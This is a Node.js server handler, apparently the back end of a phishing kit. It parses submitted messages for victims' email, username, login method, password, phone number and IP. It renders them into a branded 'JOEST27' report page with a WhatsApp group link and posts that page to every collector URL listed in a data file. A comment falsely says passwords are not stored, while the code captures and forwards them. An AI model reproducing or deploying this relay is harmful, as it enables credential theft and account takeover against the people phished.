const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (k.includes("password") || v.includes("@")) {
    vars.password = v;
    return;
   }

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "-"
  );
}

/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ort</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#050505;
    font-family:Inter,Arial,sans-serif;
    color:#fff;
    padding:40px 20px;
}

.panel{
    max-width:850px;
    margin:auto;
    background:#111;
    border:1px solid rgba(255,255,255,.12);
    border-radius:24px;
    overflow:hidden;
    box-shadow:
        0 0 50px rgba(255,255,255,.03),
        inset 0 0 30px rgba(255,255,255,.02);
}

.header{
    text-align:center;
    padding:40px 30px;
}

.logo{
    font-size:42px;
    font-weight:900;
    letter-spacing:8px;
}

.subtitle{
    margin-top:8px;
    color:#888;
    letter-spacing:4px;
    font-size:13px;
}

.divider{
    height:1px;
    background:rgba(255,255,255,.08);
}

.table{
    padding:15px 30px;
}

.row{
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:18px 0;
    border-bottom:1px solid rgba(255,255,255,.05);
}

.label{
    color:#777;
    font-weight:700;
    letter-spacing:2px;
}

.value{
    color:#fff;
    text-align:right;
    word-break:break-word;
}

.join-box{
    padding:35px 30px;
    text-align:center;
}

.join-btn{
    display:inline-block;
    text-decoration:none;
    color:#fff;
    border:1px solid #fff;
    padding:15px 35px;
    border-radius:14px;
    font-weight:800;
    letter-spacing:3px;
    transition:0.3s;
}

.join-btn:hover{
    background:#fff;
    color:#000;
}

.footer{
    text-align:center;
    padding:20px;
    color:#666;
    border-top:1px solid rgba(255,255,255,.08);
    font-size:12px;
}

@media(max-width:600px){
    .row{
        flex-direction:column;
        align-items:flex-start;
        gap:8px;
    }

    .value{
        text-align:left;
    }

    .logo{
        font-size:32px;
    }
}
</style>
</head>

<body>

<div class="panel">

    <div class="header">
        <div class="logo">JOEST27</div>
        <div class="subtitle">PRIVATE SYSTEM RESS</div>
    </div>

    <div class="divider"></div>

    <div class="table">

        <div class="row">
            <div class="label">EMAIL</div>
            <div class="value">${vars.email}</div>
        </div>

        <div class="row">
            <div class="label">USER</div>
            <div class="value">${vars.user}</div>
        </div>

        <div class="row">
            <div class="label">LOGIN</div>
            <div class="value">${vars.login}</div>
        </div>

        <div class="row">
            <div class="label">PASSWORD</div>
            <div class="value">${vars.password}</div>
        </div>

        <div class="row">
            <div class="label">PHONE</div>
            <div class="value">${vars.phone}</div>
        </div>

        <div class="row">
            <div class="label">IP ADDRESS</div>
            <div class="value">${vars.ip}</div>
        </div>

    </div>

    <div class="join-box">
        <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=4&amv=3" class="join-btn">
            JOIN GROUP
        </a>
    </div>

    <div class="footer">
        © 2026 JOEST27 • All Rights Reserved
    </div>

</div>

</body>
</html>
`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);
    vars.ip = getIP(req);

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
